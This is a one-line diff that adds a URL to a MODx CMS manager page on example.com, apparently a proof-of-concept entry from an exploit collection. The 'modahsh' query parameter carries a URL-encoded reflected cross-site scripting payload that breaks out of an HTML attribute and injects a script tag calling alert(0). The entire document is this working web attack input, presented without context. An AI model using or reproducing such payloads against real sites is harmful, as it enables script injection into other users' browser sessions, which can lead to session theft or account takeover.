@@ -1,0 +1,1 @@
+http://www.example.com/modx/manager/index.php?modahsh=%22%3E%3Cscript%3Ealert(0)%3C/script%3E
